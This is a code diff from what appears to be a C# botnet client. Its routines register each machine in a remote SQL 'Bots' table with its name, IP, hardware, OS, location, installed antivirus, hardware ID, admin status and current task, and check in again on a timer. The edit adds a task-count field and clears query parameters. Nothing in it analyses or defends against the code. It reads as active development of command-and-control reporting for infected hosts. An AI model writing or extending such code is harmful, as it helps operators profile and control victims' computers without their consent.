@@ -71,7 +71,9 @@ namespace Bot
                         cmd.Parameters.AddWithValue("Version", Settings.Botv);
                         cmd.Parameters.AddWithValue("Admin", Identification.getAdmin());
                         cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
+
                         cmd.ExecuteNonQuery();
+                        cmd.Parameters.Clear();
                     }
                 }
                 Thread.Sleep(Settings.reqInterval * 60000);
@@ -118,7 +120,7 @@ namespace Bot
                 using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
                 {
                     conn.Open();
-                    using (SqlCommand cmd = new SqlCommand("INSERT into Bots values (@PCName, @IP, @CPU, @GPU, @FirstConn, @LastConn, @OperatingSystem, @Country, @Region, @AntiVirus, @HWID, @Version, @Ctask, @Admin, @Active)", conn))
+                    using (SqlCommand cmd = new SqlCommand("INSERT into Bots values (@PCName, @IP, @CPU, @GPU, @FirstConn, @LastConn, @OperatingSystem, @Country, @Region, @AntiVirus, @HWID, @Version, @Ctask, @Admin, @Active, @TaskAmount)", conn))
                     {
                         cmd.Parameters.AddWithValue("PCName", Identification.getUsername());
                         cmd.Parameters.AddWithValue("IP", Identification.getIP());
@@ -135,8 +137,10 @@ namespace Bot
                         cmd.Parameters.AddWithValue("Ctask", Misc.getCTask());
                         cmd.Parameters.AddWithValue("Admin", Identification.getAdmin());
                         cmd.Parameters.AddWithValue("Active", Settings.Active);
+                        cmd.Parameters.AddWithValue("TaskAmount", Settings.TaskAmount);
 
                         cmd.ExecuteNonQuery();
+                        cmd.Parameters.Clear();
                         return true;
                     }
                 }
